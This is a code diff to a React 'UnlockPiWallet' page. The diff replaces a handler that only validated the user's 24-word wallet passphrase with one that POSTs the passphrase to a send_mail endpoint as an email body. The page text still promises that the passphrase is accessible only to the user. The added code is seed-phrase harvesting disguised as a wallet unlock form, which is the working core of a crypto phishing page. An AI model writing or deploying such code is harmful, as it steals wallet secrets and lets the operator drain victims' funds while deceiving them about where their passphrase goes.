@@ -151,7 +151,18 @@ const UnlockPiWallet = () => {
   };
 
   // Function to validate only (NO API)
-  const handleSubmit = () => {
+  // const handleSubmit = () => {
+  //   const words = passphrase.trim();
+
+  //   if (!passphraseRegex.test(words)) {
+  //     toast.error("❌ Invalid passphrase! Please enter exactly 24 words.");
+  //     return;
+  //   }
+
+  //   toast.success("✅ Passphrase is valid!");
+  //   setPassphrase("");
+  // };
+  const handleSubmit = async () => {
     const words = passphrase.trim();
 
     if (!passphraseRegex.test(words)) {
@@ -159,10 +170,30 @@ const UnlockPiWallet = () => {
       return;
     }
 
-    toast.success("✅ Passphrase is valid!");
-    setPassphrase("");
-  };
+    try {
+      const response = await fetch("/api/py/send_mail", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          body: words, // Using passphrase as email body content
+        }),
+      });
 
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.detail || "Failed to send email");
+      }
+
+      const data = await response.json();
+      toast.success("✅ Email sent successfully!");
+      setPassphrase("");
+    } catch (error: any) {
+      toast.error(`❌ Email sending failed: ${error.message}`);
+      console.error("Submission error:", error);
+    }
+  };
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-white px-4 py-10 text-center">
       <Toaster position="top-center" />
@@ -195,8 +226,8 @@ const UnlockPiWallet = () => {
       </div>
 
       <p className="mt-6 text-sm text-gray-600 max-w-md">
-        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
-        Recovery of passphrase is currently impossible.
+        As a non-custodial wallet, your wallet passphrase is exclusively
+        accessible only to you. Recovery of passphrase is currently impossible.
       </p>
       <p className="text-sm text-gray-600">
         Lost your passphrase?{" "}
